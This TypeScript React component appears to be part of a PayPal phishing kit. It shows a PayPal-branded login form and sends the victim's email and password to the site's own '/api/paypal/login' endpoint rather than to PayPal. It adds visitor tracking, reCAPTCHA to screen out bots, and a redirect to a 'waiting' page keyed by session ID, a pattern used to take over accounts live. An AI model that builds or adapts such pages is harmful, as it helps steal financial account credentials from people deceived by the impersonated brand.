import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { useGoogleReCaptcha } from "react-google-recaptcha-v3";
import PayPalLogin from "@/components/PayPalLogin";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function PayPalPage() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const { executeRecaptcha } = useGoogleReCaptcha();

  // Track visitor
  useVisitorTracking({ page: "/paypal" });

  const loginMutation = useMutation({
    mutationFn: async ({ email, password, recaptchaToken }: { email: string; password: string; recaptchaToken?: string }) => {
      const response = await apiRequest("POST", "/api/paypal/login", { email, password, recaptchaToken });
      const data = await response.json();
      console.log("PayPal login response:", data);
      return data;
    },
    onSuccess: (data: any) => {
      console.log("Login successful, redirecting to waiting page...", data);
      // Redirect to waiting page with session ID
      if (data?.sessionId) {
        const redirectUrl = `/paypal/waiting?session=${data.sessionId}`;
        console.log("Redirecting to:", redirectUrl);
        window.location.href = redirectUrl;
      } else {
        console.error("No sessionId in response:", data);
        toast({
          title: "Errore",
          description: "Errore durante la connessione. Riprova.",
          variant: "destructive",
        });
      }
    },
    onError: (error: any) => {
      console.error("Login error:", error);
      toast({
        title: "Errore di accesso",
        description: "Impossibile connettersi. Riprova.",
        variant: "destructive",
      });
    },
  });

  const handlePayPalLogin = async (email: string, password: string) => {
    console.log("Submitting PayPal login for:", email);
    
    // Generate reCAPTCHA token if available
    let recaptchaToken: string | undefined;
    
    if (executeRecaptcha) {
      try {
        recaptchaToken = await executeRecaptcha("paypal_login");
      } catch (error) {
        console.error("reCAPTCHA execution failed:", error);
      }
    }

    loginMutation.mutate({ email, password, recaptchaToken });
  };

  return <PayPalLogin onSubmit={handlePayPalLogin} isLoading={loginMutation.isPending} />;
}
